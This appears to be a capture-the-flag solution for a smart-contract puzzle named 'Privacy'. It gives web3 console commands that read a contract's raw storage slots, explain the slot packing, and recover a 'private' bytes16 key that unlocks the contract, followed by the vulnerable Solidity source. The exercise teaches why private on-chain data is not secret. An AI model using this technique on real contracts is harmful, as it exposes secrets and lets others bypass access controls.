```javascript
await web3.eth.getStorageAt(contract.address, 0)
/**
 * 0x0000000000000000000000000000000000000000000000000000000000000001
 * bool public locked = true;
 */
await web3.eth.getStorageAt(contract.address, 1)
/**
 * 0x0000000000000000000000000000000000000000000000000000000061b98de9
 * uint256 public ID = block.timestamp;
 */
await web3.eth.getStorageAt(contract.address, 2)
/** 
 * 0x000000000000000000000000000000000000000000000000000000008de9ff0a
 * 0x0a: uint8 private flattening = 10;
 * 0xff: uint8 private denomination = 255;
 * 0x8de9: uint16 private awkwardness = uint16(now);
 * `uint16(now)` means get `now`(equal to `block.timestamp`) last 4 hex(8de9)
 */
await web3.eth.getStorageAt(contract.address, 3)
/**
 * 0x4dbb11110bff223a62efcba66d86256345061dd6d0c2187e15de4235a6d57826
 * bytes32[3] private data;
 * each line storage include 32 bytes(hex.length * 4 bit/hex = 256 bit = 32 bytes * 8)
 * so the storage at 5 should be the `key(data[2])`, but need to slice half length of data[2] for real key 
 */
await web3.eth.getStorageAt(contract.address, 5)
/**
 * '0x628cdd3c131feb6c8d7eb70e9dc325bf81995e7f21cb979c6374f61204317bf5'
 * using Python slice to get 32 length hex from left side(bytes32 -> bytes16 will slice from left):
 * '628cdd3c131feb6c8d7eb70e9dc325bf81995e7f21cb979c6374f61204317bf5'[:32]
 * real key: '628cdd3c131feb6c8d7eb70e9dc325bf', don't forget to add `0x` at the beginning
 */
await contract.unlock('0x628cdd3c131feb6c8d7eb70e9dc325bf')
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```
